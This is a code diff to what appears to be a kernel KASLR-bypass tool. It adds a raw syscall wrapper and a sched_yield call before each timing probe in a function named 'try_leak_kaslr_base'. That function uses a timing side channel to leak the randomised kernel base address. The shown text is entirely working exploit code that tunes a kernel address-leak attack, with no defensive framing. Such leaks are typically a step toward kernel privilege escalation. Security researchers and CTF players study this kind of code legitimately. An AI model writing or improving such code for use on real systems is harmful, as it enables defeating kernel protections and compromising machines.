@@ -148,6 +148,24 @@ uint64_t sidechannel(uint64_t addr) {
     return delta;
 }
 
+static __always_inline uint64_t syscall0(uint64_t nr)
+{
+    uint64_t ret;
+
+    asm volatile("syscall"
+        : "=a"(ret)
+        : "a"(nr)
+        : "memory", "rcx", "r11"
+    );
+
+    return ret;
+}
+
+static __always_inline int _sched_yield(void)
+{
+    return syscall0(SYS_sched_yield);
+}
+
 std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(int samples) {
     size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
     std::vector<std::vector<uint64_t>> all_timings(slots);
@@ -158,6 +176,7 @@ std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(in
     for (int i = 0; i < samples; i++) {
         for (size_t slot = 0; slot < slots; slot++) {
             uint64_t addr = slot_to_addr(slot);
+            _sched_yield();
             uint64_t timing = sidechannel(addr);
             all_timings[slot].push_back(timing);
         }
